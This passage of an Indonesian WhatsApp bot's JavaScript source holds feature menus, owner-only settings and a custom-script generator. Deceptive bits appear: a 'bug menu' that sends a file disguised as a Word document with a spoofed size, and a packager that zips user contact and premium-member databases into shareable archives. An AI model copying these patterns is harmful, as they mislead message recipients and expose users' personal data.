                                                                description: 'Fitur clone/make bot',
                                                                id: '.ditssjadibot'
                                                            }
                                                        ]
                                                    },
                                                    {
                                                        title: 'Pilihan Free!',
                                                        rows: [{
                                                                title: 'semua Menu 🐣',
                                                                description: 'Tampilkan semua fitur',
                                                                id: '.menuall'
                                                            },
                                                            {
                                                                title: 'menu populer 🐣',
                                                                description: 'Fitur paling sering dipakai',
                                                                id: '.ditsspopuler'
                                                            },
                                                            {
                                                                title: 'menu Quotes 🐣',
                                                                description: 'Fitur quotes keren',
                                                                id: '.ditssquotes'
                                                            },
                                                            {
                                                                title: 'menu anonymous 🐣',
                                                                description: 'Fitur anonim chat',
                                                                id: '.ditssanonymous'
                                                            },
                                                            {
                                                                title: 'menu belajar 🐣',
                                                                description: 'Fitur edukatif/belajar',
                                                                id: '.ditssbelajar'
                                                            },
                                                            {
                                                                title: 'menu Jaga Group 🐣',
                                                                description: 'Fitur anti-link & lainnya',
                                                                id: '.ditssjagagrup'
                                                            },
                                                            {
                                                                title: 'menu Islami 🐣',
                                                                description: 'Fitur islami seperti doa, dzikir',
                                                                id: '.ditssislam'
                                                            },
                                                            {
                                                                title: 'menu berita 🐣',
                                                                description: 'Berita terbaru',
                                                                id: '.ditssberita'
                                                            },
                                                            {
                                                                title: 'menu sticker 🐣',
                                                                description: 'Fitur bikin dan ubah stiker',
                                                                id: '.ditsssticker'
                                                            },
                                                            {
                                                                title: 'menu Fun 🐣',
                                                                description: 'Fitur lucu & seru',
                                                                id: '.ditssfun'
                                                            },
                                                            {
                                                                title: 'menu Rpg 🐣',
                                                                description: 'Game RPG text',
                                                                id: '.ditssrpg'
                                                            },
                                                            {
                                                                title: 'menu Tools 🐣',
                                                                description: 'Tools bantu kamu',
                                                                id: '.ditsstools'
                                                            },
                                                            {
                                                                title: 'menu Shop 🐣',
                                                                description: 'Belanja lewat bot',
                                                                id: '.ditssshop'
                                                            },
                                                            {
                                                                title: 'menu Game 🐣',
                                                                description: 'Game bot seru',
                                                                id: '.ditssgame'
                                                            },
                                                            {
                                                                title: 'menu Anime 🐣',
                                                                description: 'Fitur seputar anime',
                                                                id: '.ditssanime'
                                                            },
                                                            {
                                                                title: 'menu Group 🐣',
                                                                description: 'Tools buat group',
                                                                id: '.ditssgroup'
                                                            },
                                                            {
                                                                title: 'menu Owner 🐣',
                                                                description: 'Fitur khusus owner',
                                                                id: '.ditssowner'
                                                            },
                                                            {
                                                                title: 'menu Primbon 🐣',
                                                                description: 'Fitur ramalan',
                                                                id: '.ditssprimbon'
                                                            },
                                                            {
                                                                title: 'menu Convert 🐣',
                                                                description: 'Konversi media',
                                                                id: '.ditssconvert'
                                                            },
                                                            {
                                                                title: 'menu Ephoto 🐣',
                                                                description: 'Efek gambar keren',
                                                                id: '.ditssephoto'
                                                            },
                                                            {
                                                                title: 'menu Search 🐣',
                                                                description: 'Fitur pencarian',
                                                                id: '.ditsssearch'
                                                            },
                                                            {
                                                                title: 'menu Ai 🐣',
                                                                description: 'AI bot fitur',
                                                                id: '.ditssai'
                                                            },
                                                            {
                                                                title: 'menu Photoxy 🐣',
                                                                description: 'Edit foto online',
                                                                id: '.ditssphotoxy'
                                                            },
                                                            {
                                                                title: 'menu Random 🐣',
                                                                description: 'Fitur random',
                                                                id: '.ditssrandom'
                                                            },
                                                            {
                                                                title: 'menu Audio 🐣',
                                                                description: 'Fitur audio',
                                                                id: '.ditssaudio'
                                                            },
                                                            {
                                                                title: 'menu Sound 🐣',
                                                                description: 'Soundpack bot',
                                                                id: '.ditsssound'
                                                            },
                                                            {
                                                                title: 'menu Download 🐣',
                                                                description: 'Download media',
                                                                id: '.ditssdownload'
                                                            },
                                                            {
                                                                title: 'menu Text Pro 🐣',
                                                                description: 'Text Pro style',
                                                                id: '.ditsstextpro'
                                                            }
                                                        ]
                                                    }
                                                ]
                                            })
                                        },
                                        {
                                            name: 'cta_url',
                                            buttonParamsJson: JSON.stringify({
                                                display_text: "Developer",
                                                url: 'wa.me/6283824410117',
                                                merchant_url: 'wa.me/6283824410117'
                                            })
                                        }
                                    ]
                                }
                            }
                        }
                    }
                }, {
                    userJid: m.sender,
                    quoted: m
                })

                await Putzz.relayMessage(msgii.key.remoteJid, msgii.message, {
                    messageId: msgii.key.id
                })

                // Musik random & validasi daftar
                let pler = await fetchJson('https://raw.githubusercontent.com/ditss-dev/database/main/music.json')
                let itil = pler[Math.floor(Math.random() * pler.length)]
{
                    await Putzz.sendMessage(m.chat, {
                        audio: {
                            url: itil
                        },
                        mimetype: 'audio/mp4',
                        ptt: true,
                        fileLength: 88738
                    }, {
                        quoted: fdoc
                    })
                }
            }
            break

// case
case 'owneroff': {
if (!isCreator) return ReplyLanz(mess.owner)
    if (args[0] === 'on') {
        global.db.settings.owneroffmode = true;
        Putzz.sendMessage(m.chat, { text: "Bot Owner sedang OFFLINE. Semua chat selain creator akan mendapatkan auto Reply ini." }, { quoted: qfake });
        break;
    }
    if (args[0] === 'off') {
        global.db.settings.owneroffmode = false;
        Putzz.sendMessage(m.chat, { text: "Bot Owner sudah ONLINE kembali." }, { quoted: qtext2 });
        break;
    }
    Putzz.sendMessage(m.chat, { text: "Perintah tidak valid! Gunakan: *owneroff on* atau *owneroff off*." }, { quoted: qfake });
    }
    break

/* fitur anti call
// bisa custom peringatan (contoh: peringatan buat 1x nelp lgi akan diblock) 

// taruh di sebelum switch command
let anticall = false
let callWarning = {} 
Putzz.ws.on('CB:call', async (json) => {
  if (!anticall) return
  let call = json.content[0]
  if (call.tag === 'offer') {
    let callerId = json.attrs.from
    if (!callWarning[callerId]) {
      callWarning[callerId] = 1 // ubah aj max block
      await Putzz.sendMessage(callerId, {
        text: '*[PERINGATAN CALL]*\n\nJangan menelpon bot! Jika Anda menelpon lagi, Anda akan diblokir otomatis.',
      })
    } else {
      await Putzz.sendMessage(callerId, {
        text: '*[ANTI-CALL]*\n\nAnda sudah diperingatkan. Karena masih menelpon, Anda sekarang diblokir.',
      })
      await new Promise(resolve => setTimeout(resolve, 1000))
      await Putzz.updateBlockStatus(callerId, 'block')
      delete callWarning[callerId] 
    }
  }
})

case*/
case 'addakses': {
  if (!isCreator) return ReplyLanz('Khusus owner!');
  if (!m.isGroup) return ReplyLanz('Ketik perintah ini di grup yang ingin diberi akses.');
  if (aksesGrup.groups.includes(m.chat)) return ReplyLanz('Grup ini sudah punya akses.');
  aksesGrup.groups.push(m.chat);
  saveAksesGrup();
  ReplyLanz('Grup ini sekarang punya akses ke fitur-fitur bot.');
}
break
case 'undakses': {
  if (!isCreator) return ReplyLanz('Khusus owner!');
  if (!m.isGroup) return ReplyLanz('Ketik perintah ini di grup yang ingin dicabut aksesnya.');
  if (!aksesGrup.groups.includes(m.chat)) return ReplyLanz('Grup ini belum punya akses.');
  aksesGrup.groups = aksesGrup.groups.filter(g => g !== m.chat);
  saveAksesGrup();
  ReplyLanz('Akses grup ini telah dicabut.');
}
break

case 'anticall':
  if (!isCreator) return ReplyLanz('Fitur ini hanya untuk owner!')
  if (!q) return ReplyLanz(`*Contoh:* ${prefix}anticall on/off`)
  if (q === 'on') {
    anticall = true
    ReplyLanz('✅ Anti Call telah *diaktifkan*.')
  } else if (q === 'off') {
    anticall = false
    ReplyLanz('❌ Anti Call telah *dinonaktifkan*.')
  } else {
    ReplyLanz(`*Contoh:* ${prefix}anticall on/off`)
  }
  break

/* *Image to Anime/real style*
 * Type: Case
 * Mampir vchatsz.web.app
 */

//const { uploader } = require('@vioo/apis')
//const quoted = m.quoted ? m.quoted : m
//const mime = (quoted.msg || quoted).mimetype || ''
case 'toanime2':
case 'jadianime2': {
    
   // if (!quoted) return ReplyLanz('Harap balas ke foto yang ingin dikonversi ke anime')
    if (!/image/.test(mime)) return ReplyLanz(`Kirim/Balas foto dengan caption ${prefix + command}`)

    const BodyForm = require('form-data')
    const uploadFileUgu = async (input) => {
        try {
            const form = new BodyForm()
            form.append("files[]", fs.createReadStream(input))
        //    const l require('axios');
            const { data } = await axios({
                url: "https://uguu.se/upload.php",
                method: "POST",
                headers: {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
                    ...form.getHeaders()
                },
                data: form,
                timeout: 10000 
            })
            
            if (!data?.files?.[0]) throw new Error('Upload failed')
            return data.files[0]
            
        } catch (err) {
            throw new Error(`Error uploading file: ${err.message}`)
        }
    }

    try {
      
        await Putzz.sendMessage(m.chat, { 
            react: { 
                text: '⏱️', 
                key: m.key 
            }
        })

       
        const media = await Putzz.downloadAndSaveMediaMessage(qmsg)
        const uploadResult = await uploadFileUgu(media)
        const imageUrl = `https://api.botwa.connxdzz.me/api/maker/convertanime?url=${uploadResult.url}&apikey=freekey`
        
        
        await Putzz.sendMessage(m.chat, { 
            image: { url: imageUrl }, 
            caption: mess.done 
        }, { 
            quoted: m 
        })

      
        fs.unlinkSync(media)
        
    } catch (error) {
        console.error('Error in toanime:', error)
        ReplyLanz('Maaf, terjadi kesalahan saat memproses gambar. Silakan coba lagi nanti atau hubungi pemilik bot jika masalah berlanjut.')
    }
}
break

/*
*[ FITUR BANCHAT ]*
banned chat di grup tertentu
Req: +62 823-...
Type? Case
*Sumber?* https://whatsapp.com/channel/0029VakRR89L7UVPwf53TB0v
*Code?*
*/


/*case "cpanelmenu": {
    const msgii = await generateWAMessageFromContent(m.chat, {
        viewOnceMessageV2Extension: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: { text: ``
            },
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards: [{
                            body: proto.Message.InteractiveMessage.Body.fromObject({}),
                            footer: proto.Message.InteractiveMessage.Footer.fromObject({text: "𝗦𝗘𝗥𝗩𝗘𝗥 𝗞𝗘-𝟭"}),
                            header: proto.Message.InteractiveMessage.Header.fromObject({
                                title: `
┏╍╍【﻿ 𝐂𝐏𝐀𝐍𝐄𝐋 𝐌𝐄𝐍𝐔 𝐕𝟏 】
╏ ${prefix}𝟏𝐠𝐛-𝐯𝟏 username
╏ ${prefix}𝟐𝐠𝐛-𝐯𝟏 username
╏ ${prefix}𝟑𝐠𝐛-𝐯𝟏 username
╏ ${prefix}𝟒𝐠𝐛-𝐯𝟏 username
╏ ${prefix}𝟓𝐠𝐛-𝐯𝟏 username
╏ ${prefix}𝟔𝐠𝐛-𝐯𝟏 username
╏ ${prefix}𝟕𝐠𝐛-𝐯𝟏 username
╏ ${prefix}𝟖𝐠𝐛-𝐯𝟏 username
╏ ${prefix}𝟗𝐠𝐛-𝐯𝟏 username
╏ ${prefix}𝟏𝟎𝐠𝐛-𝐯𝟏 username
╏ ${prefix}𝐮𝐧𝐥𝐢-𝐯𝟏 username
┗╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╾▣
┏╍╍【﻿ 𝐂𝐏𝐀𝐍𝐄𝐋𝟐 𝐌𝐄𝐍𝐔 𝐕𝟏 】
╏ ${prefix}𝟏𝐠𝐛𝟐-𝐯𝟏 username,628xx
╏ ${prefix}𝟐𝐠𝐛𝟐-𝐯𝟏 username,628xx
╏ ${prefix}𝟑𝐠𝐛𝟐-𝐯𝟏 username,628xx
╏ ${prefix}𝟒𝐠𝐛𝟐-𝐯𝟏 username,628xx
╏ ${prefix}𝟓𝐠𝐛𝟐-𝐯𝟏 username,628xx
╏ ${prefix}𝟔𝐠𝐛𝟐-𝐯𝟏 username,628xx
╏ ${prefix}𝟕𝐠𝐛𝟐-𝐯𝟏 username,628xx
╏ ${prefix}𝟖𝐠𝐛𝟐-𝐯𝟏 username,628xx
╏ ${prefix}𝟗𝐠𝐛𝟐-𝐯𝟏 username,628xx
╏ ${prefix}𝟏𝟎𝐠𝐛𝟐-𝐯𝟏 username,628xx
╏ ${prefix}𝐮𝐧𝐥𝐢𝟐-𝐯𝟏 username,628xx
┗╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╾▣
`,
                                hasMediaAttachment: true,
                                ...(await prepareWAMessageMedia({ image: { url: ppmenu }}, { upload: Putzz.waUploadToServer }))
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                buttons: [
                                    {
                                        name: "cta_url",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "Beli Akses",
                                            url: `https://wa.me/${owner}`,
                                            merchant_url: `https://wa.me/${owner}`
                                        })
                                    }
                                ]
                            })
                        }]
                    })
            }
        }
    }, { userJid: m.sender, quoted: qlive });

    await Putzz.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id });
}
break;*/
// case
case 'banchat': case "addbl": {
  if (!isOwner) return ReplyLanz('❌ Khusus owner!');
  if (!m.isGroup) return ReplyLanz('❌ Hanya bisa di grup!');
  if (!banchat.includes(m.chat)) {
    banchat.push(m.chat);
    fs.writeFileSync(banchatFile, JSON.stringify(banchat, null, 2));
    ReplyLanz('✅ Grup ini telah *dibanned*. Semua command akan diabaikan.');
  } else {
    ReplyLanz('⚠️ Grup ini sudah dibanned. Gunakan .unbanchat untuk membuka.');
  }
}
break

case 'unbanchat': case "unbl": {
  if (!isOwner) return ReplyLanz('❌ Khusus owner!');
  if (!m.isGroup) return ReplyLanz('❌ Hanya bisa di grup!');
  if (!banchat.includes(m.chat)) {
    ReplyLanz('✅ Grup ini belum diban.');
  } else {
    banchat = banchat.filter(id => id !== m.chat);
    fs.writeFileSync(banchatFile, JSON.stringify(banchat, null, 2));
    ReplyLanz('✅ Grup ini telah *di-unban*. Semua command kembali aktif.');
  }
}
break

case 'listbanchat': case "listbl":{
  if (!isOwner) return ReplyLanz('❌ Khusus owner!');
  if (banchat.length === 0) return ReplyLanz('✅ Tidak ada grup yang dibanned.');
  let teks = `📛 *Daftar Grup yang Dibanned:*\n\n`;
  for (let id of banchat) {
    teks += `• ${id}\n`;
  }
  ReplyLanz(teks);
}
break
case 'autoaigc':
case 'autoai': {
if (!isOwner) return reply(mess.owner)
if (!args[0]) return m.reply(`Contoh: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.autoaigc = true
await m.reply(`Sukses mengaktifkan ${command}.`)
} else if (args[0] === 'off') {
global.autoaigc = false
await m.reply(`Sukses menonaktifkan ${command}.`)
}}
break
// sumber? Ch ini 
// janlup npm i archiver

case "Csc2e": {
  if (!isCreator) return ReplyLanz('*[ System Notice ]* Khusus Owner');
  if (!text) return ReplyLanz(`Masukkan fitur yang diinginkan, dipisahkan dengan koma.\nContoh: ${prefix}createsc tiktok,sticker,play`);
  
  await ReplyLanz('⏳ Sedang membuat script custom, mohon tunggu...');
  
  try {
    const archiver = require('archiver');
   // const equire('path');
    //const equire('fs');
    
    // Buat direktori temp jika belum ada
    const tempDir = './temp';
    if (!fs.existsSync(tempDir)) {
      fs.mkdirSync(tempDir, { recursive: true });
    }
    
    // Buat direktori untuk script custom
    const scriptName = `Putzz-Custom_${Math.floor(Math.random() * 10000)}`;
    const scriptDir = path.join(tempDir, scriptName);
    if (!fs.existsSync(scriptDir)) {
      fs.mkdirSync(scriptDir, { recursive: true });
    }
    
    // Buat subdirektori yang diperlukan
    const dirs = [
      'library', 'library/database', 'library/database/sampah',
      'session', 'source', 'source/media'
    ];
    
    dirs.forEach(dir => {
      const fullPath = path.join(scriptDir, dir);
      if (!fs.existsSync(fullPath)) {
        fs.mkdirSync(fullPath, { recursive: true });
      }
    });
    
    // Baca file Putzz.js asli
    const originalPutzz = fs.readFileSync('./system/Putzz.js', 'utf8');
    
    // Ekstrak bagian awal file (sebelum switch command)
    const startPart = originalPutzz.split('switch (command) {')[0];
    
    // Ekstrak bagian akhir file (setelah switch command)
    const endPart = originalPutzz.split('switch (command) {')[1].split(/}(\s*)$/)[1];
    
    // Ekstrak semua case dari file asli
    const caseRegex = /case\s+(['"])([^'"]+)\1\s*:\s*{([\s\S]*?)(?=case\s+['"]|$)/g;
    const allCases = {};
    let match;
    
    while ((match = caseRegex.exec(originalPutzz)) !== null) {
      const caseName = match[2];
      const caseContent = match[0];
      allCases[caseName] = caseContent;
    }
    
    // Tambahkan case menu dan help secara default
    const requestedFeatures = ['menu', 'anticall', 'allmenu', ...text.toLowerCase().split(',').map(f => f.trim())];
    
    // Buat konten switch command baru
    let newSwitchContent = 'switch (command) {\n';
    
    // Tambahkan case yang diminta
    requestedFeatures.forEach(feature => {
      if (allCases[feature]) {
        newSwitchContent += allCases[feature];
      }
    });
    
    // Putzzp switch statement
    newSwitchContent += '}\n';
    
    // Buat file Putzz.js baru
    const newPutzzContent = startPart + newSwitchContent + endPart;
    fs.writeFileSync(path.join(scriptDir, 'Putzz.js'), newPutzzContent);
    
    // Salin file-file penting lainnya
    const filesToCopy = [
      'settings.js',
      'package.json',
      'start.js',
    ];
    
    filesToCopy.forEach(file => {
      if (fs.existsSync(`./${file}`)) {
        fs.copyFileSync(`./${file}`, path.join(scriptDir, file));
      }
    });
    
    // Salin file-file di library
    const libFiles = [
      'library/converter.js',
      'library/savesaluran.json',
      'library/exif.js',
      'library/function.js',
      'library/hd.js',
      'library/scraper.js',
      'library/welcome.js'
    ];
    
    libFiles.forEach(file => {
      if (fs.existsSync(`./${file}`)) {
        fs.copyFileSync(`./${file}`, path.join(scriptDir, file));
      }
    });
    
    // Salin file-file di source
    const sourceFiles = [
      'source/database.js',
      'source/message.js',
    ];
    
    sourceFiles.forEach(file => {
      if (fs.existsSync(`./${file}`)) {
        fs.copyFileSync(`./${file}`, path.join(scriptDir, file));
      }
    });
    
    // Salin file-file database
    const dbFiles = [
      'library/database/contacts.json',
      'library/database/database.json',
      'library/database/giveaways.json',
      'library/database/list.json',
      'library/database/owner.json',
      'library/database/userVip/premium.json',
    ];
    
    dbFiles.forEach(file => {
      if (fs.existsSync(`./${file}`)) {
        fs.copyFileSync(`./${file}`, path.join(scriptDir, file));
      }
    });
    
    // Buat file README.md
    const readmeContent = `# ${scriptName}
    
## Bot WhatsApp Custom

Bot ini dibuat menggunakan fitur createsc dari Putzz Bot.

### Fitur yang tersedia:
${requestedFeatures.map(f => `- ${f}`).join('\n')}

### Cara Penggunaan:
1. Install dependencies: \`npm install\`
2. Jalankan bot: \`npm start\`

© ${namaOwner} - ${new Date().getFullYear()}

join channel : 

`;
    
    fs.writeFileSync(path.join(scriptDir, 'README.md'), readmeContent);
    
    // Buat file ZIP
    const zipPath = path.join(tempDir, `${scriptName}.zip`);
    const output = fs.createWriteStream(zipPath);
    const archive = archiver('zip', {
      zlib: { level: 9 }
    });
    
    archive.pipe(output);
    archive.directory(scriptDir, false);
    
    await new Promise((resolve, reject) => {
      output.on('close', resolve);
      archive.on('error', reject);
      archive.finalize();
    });
    
    // Kirim file ZIP
    await Putzz.sendMessage(m.chat, {
      document: fs.readFileSync(zipPath),
      fileName: `${scriptName}.zip`,
      mimetype: 'application/zip',
      caption: `✅ *Script Custom Berhasil Dibuat*\n\n*Nama:* ${scriptName}\n*Fitur:* ${requestedFeatures.join(', ')}\n\nSilahkan extract file dan jalankan dengan perintah:\n\`\`\`npm install && npm start\`\`\``
    }, { quoted: m });
    
    // Hapus file temporary
    fs.rmSync(scriptDir, { recursive: true, force: true });
    fs.unlinkSync(zipPath);
    
    ReplyLanz('✅ Script custom berhasil dikirim!');
  } catch (err) {
    console.error('Error creating custom script:', err);
    ReplyLanz(`❌ Terjadi kesalahan saat membuat script:\n${err.message}`);
  }
}
break

case "putzz-bugmenu": {
    const kodeEpep = detectOperator(nomore);
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const usedMem = totalMem - freeMem;
    let timestamp = speed()
    let latensi = speed() - timestamp
   let teksnya = `☠︎︎ SYSTEM_FAILURE://BOT_CORE

> ⚠︎ OWNER_ID :: ${namaOwner}
> ⚠︎ INSTANCE :: ${botname}
> ⚠︎ BUILD_VER :: ${versi}
> ⚠︎ MODULES :: ${totalFitur()}
> ⚠︎ CORE_TYPE :: EXEC-PLUGIN

╳̷̶̷̸̷̶̷̸ ERROR_STACK_TRACE ╳̷̶̷̸̷̶̷̸
> ⛧ USER :: ${m.pushName}
> ⛧ ACCESS :: ${isCreator ? 'ROOT' : isPremium ? 'ELEVATED' : 'LIMITED'}
> ⛧ ID :: ${m.sender.split('@')[0]}
> ⛧ NETWORK :: ${kodeEpep}

⛔ WARNING: unstable runtime detected...
⛔ memory leak :: overflow...
⛔ kernel panic :: imminent...

█▓▒░ SYSTEM CORRUPTED ░▒▓█`

await Putzz.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
 
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `By ${namaOwner} </>`,
  mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
  fileLength: 99999999,
  caption: teksnya,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.ceha,
   newsletterName: global.namaSaluran
   }, 
    externalAdReply: {
      title: `${botname} - ${versi}`,
      body: `📍 Runtime : ${runtime(process.uptime())}`,
      thumbnailUrl: ppmenu,
      sourceUrl: `wa.me/6283824410117`,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break
case "mtools": case "menutools": case "toolmenu": {
let fun = `*ʜᴀʟʟᴏ ${m.pushName}.*  ɴᴀᴍᴀ ꜱᴀyᴀ ᴀᴅᴀʟᴀʜ *${botname}*, ʏᴀɴɢ ʙɪsᴀ ᴍᴇᴍʙᴀɴᴛᴜ ᴋᴀᴍᴜ

ʙᴏᴛ ɪɴɪ ᴅᴀᴘᴀᴛ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ʙᴇʀʙᴀɢᴀɪ ᴍᴀᴄᴀᴍ, ʙᴏᴛ ɪɴɪ ᴄᴏᴄᴏᴋ ᴜɴᴛᴜᴋ ᴊᴀɢᴀ ɢʀᴜᴘ. ᴋᴀᴍᴜ ʙɪsᴀ ɢᴜɴᴀᴋᴀɴ ʙᴏᴛ ɪɴɪ ᴜɴᴛᴜᴋ ᴜɴᴅᴜʜ ᴍᴇᴅɪᴀ,ᴇᴅᴜᴋᴀsɪ, ʙᴇʟᴀᴊᴀʀ ᴅᴀɴ ʟᴀɪɴɴʏᴀ, ʏᴀɴɢ ᴅᴀᴘᴀᴛ ᴍᴇᴍʙᴜᴀᴛ ʟᴇʙɪʜ ᴍᴜᴅᴀʜ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀʟᴀɴᴋᴀɴ sᴇʜᴀʀɪ ʜᴀʀɪ

✘ ᴄʀᴇᴀᴛᴏʀ: ${namaOwner}

ᴊɪᴋᴀ ᴀᴅᴀ ᴍᴀsᴀʟᴀʜ ᴅᴀʟᴀᴍ ᴘᴇɴɢɢᴜɴᴀᴀɴ sɪʟᴀʜᴋᴀɴ ʜᴜʙᴜɴɢɪ ᴄʀᴇᴀᴛᴏʀ ᴜɴᴛᴜᴋ ᴍᴇɴᴀɴʏᴀᴋᴀɴ *.ᴏᴡɴᴇʀ*

${ki}[ Mikasa Information ]${ki}
┌  ◦ ɴᴀᴍᴇ ʙᴏᴛ : ${global.botname}
│  ◦ ᴠᴇʀsɪᴏɴ : ${global.version}
│  ◦ ʙᴀɪʟᴇʏs : ${global.baileys}
│  ◦ ᴄʀᴇᴀᴛᴏʀ : ${global.namaOwner}
└  ◦ ғʀᴇғɪx : [ ᴍᴜʟᴛɪᴘʀᴇғɪx ]

${ki}[ User Information ]${ki}
┌  ◦ sᴛᴀᴛᴜs : ${isCreator ? 'ᴏᴡɴᴇʀ' : isUserPremium ? 'ᴘʀᴇᴍɪᴜᴍ' : 'ғʀᴇᴇ'}
│  ◦ ɴᴏᴍᴏʀ :  @${m?.sender.split('@')[0]} 
└  ◦ ɴᴀᴍᴇ : ${m.pushName}

──────────────────
*<> [ ᴛᴏᴏʟs - ᴍᴇɴᴜ ] <>*
┏─────────────────
┃  ❏ ${prefix}ai
┃  ❏ ${prefix}gpt
┃  ❏ ${prefix}tourl
┃  ❏ ${prefix}tourl2
┃  ❏ ${prefix}ssweb
┃  ❏ ${prefix}translate
┃  ❏ ${prefix}tohd
┃  ❏ ${prefix}shortlink
┃  ❏ ${prefix}shortlink2
┃  ❏ ${prefix}enc
┗═━═━═━═━═━═━═━═━═╴`
        Putzz.sendMessage(m.chat, {
        text: fun,
        contextInfo: {
            externalAdReply: {
                title: `Mikasa-MD Made With`,
                body: `Putzzslebew`,
                thumbnailUrl: ppmenu,
                sourceUrl: global.ceha,
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: qtext })
};
break;

case "getmsg": {
  try {
    if (!quoted) return m.reply("Reply pesan")

    let teks = util.inspect(quoted.message, {
      depth: 2,
      compact: true
    })

    teks = teks.slice(0, 4000)

    await Putzz.sendMessage(
      m.chat,
      {
        text: teks
      },
      {
        quoted: m
      }
    )

  } catch (e) {
    m.reply(util.format(e))
  }
}
break
case 'putz-dl':
case "mdl": case "menudownload": case "downloadmenu": {
let fun = `*ʜᴀʟʟᴏ ${m.pushName}.*  ɴᴀᴍᴀ ꜱᴀyᴀ ᴀᴅᴀʟᴀʜ *${botname}*, ʏᴀɴɢ ʙɪsᴀ ᴍᴇᴍʙᴀɴᴛᴜ ᴋᴀᴍᴜ

ʙᴏᴛ ɪɴɪ ᴅᴀᴘᴀᴛ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ʙᴇʀʙᴀɢᴀɪ ᴍᴀᴄᴀᴍ, ʙᴏᴛ ɪɴɪ ᴄᴏᴄᴏᴋ ᴜɴᴛᴜᴋ ᴊᴀɢᴀ ɢʀᴜᴘ. ᴋᴀᴍᴜ ʙɪsᴀ ɢᴜɴᴀᴋᴀɴ ʙᴏᴛ ɪɴɪ ᴜɴᴛᴜᴋ ᴜɴᴅᴜʜ ᴍᴇᴅɪᴀ,ᴇᴅᴜᴋᴀsɪ, ʙᴇʟᴀᴊᴀʀ ᴅᴀɴ ʟᴀɪɴɴʏᴀ, ʏᴀɴɢ ᴅᴀᴘᴀᴛ ᴍᴇᴍʙᴜᴀᴛ ʟᴇʙɪʜ ᴍᴜᴅᴀʜ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀʟᴀɴᴋᴀɴ sᴇʜᴀʀɪ ʜᴀʀɪ

✘ ᴄʀᴇᴀᴛᴏʀ: ${namaOwner}

ᴊɪᴋᴀ ᴀᴅᴀ ᴍᴀsᴀʟᴀʜ ᴅᴀʟᴀᴍ ᴘᴇɴɢɢᴜɴᴀᴀɴ sɪʟᴀʜᴋᴀɴ ʜᴜʙᴜɴɢɪ ᴄʀᴇᴀᴛᴏʀ ᴜɴᴛᴜᴋ ᴍᴇɴᴀɴʏᴀᴋᴀɴ *.ᴏᴡɴᴇʀ*

${ki}[ Mikasa Information ]${ki}
┌  ◦ ɴᴀᴍᴇ ʙᴏᴛ : ${global.botname}
│  ◦ ᴠᴇʀsɪᴏɴ : ${global.version}
│  ◦ ʙᴀɪʟᴇʏs : ${global.baileys}
│  ◦ ᴄʀᴇᴀᴛᴏʀ : ${global.namaOwner}
└  ◦ ғʀᴇғɪx : [ ᴍᴜʟᴛɪᴘʀᴇғɪx ]

${ki}[ User Information ]${ki}
┌  ◦ sᴛᴀᴛᴜs : ${isCreator ? 'ᴏᴡɴᴇʀ' : isUserPremium ? 'ᴘʀᴇᴍɪᴜᴍ' : 'ғʀᴇᴇ'}
│  ◦ ɴᴏᴍᴏʀ :  @${m?.sender.split('@')[0]} 
└  ◦ ɴᴀᴍᴇ : ${m.pushName}

──────────────────
*<> [ ᴅᴏᴡɴʟᴏᴀᴅ - ᴍᴇɴᴜ ] <>*
┏─────────────────
┃  ❏ ${prefix}tiktok
┃  ❏ ${prefix}tiktokmp3
┃  ❏ ${prefix}facebook
┃  ❏ ${prefix}capcut
┃  ❏ ${prefix}instagram
┃  ❏ ${prefix}ytmp3
┃  ❏ ${prefix}ytmp4
┃  ❏ ${prefix}play
┃  ❏ ${prefix}playvid
┃  ❏ ${prefix}gitclone
┃  ❏ ${prefix}mediafire
┗═━═━═━═━═━═━═━═━═╴`
        Putzz.sendMessage(m.chat, {
        video: {url: "https://files.catbox.moe/lejkom.mp4"}, 
        gifPlayback: true, 
        caption: fun,
        contextInfo: {
            externalAdReply: {
                title: `Mikasa-MD Made With`,
                body: `Putzzslebew`,
                thumbnailUrl: ppmenu,
                sourceUrl: global.ceha,
                mediaType: 1,
                renderLargerThumbnail: false
            }
        }
    }, { quoted: lol })
};
break;/*
case 'putz-dl':
case "mdl": case "menudownload": case "downloadmenu": {
let fun = `*ʜᴀʟʟᴏ ${m.pushName}.*  ɴᴀᴍᴀ ꜱᴀyᴀ ᴀᴅᴀʟᴀʜ *${botname}*, ʏᴀɴɢ ʙɪsᴀ ᴍᴇᴍʙᴀɴᴛᴜ ᴋᴀᴍᴜ

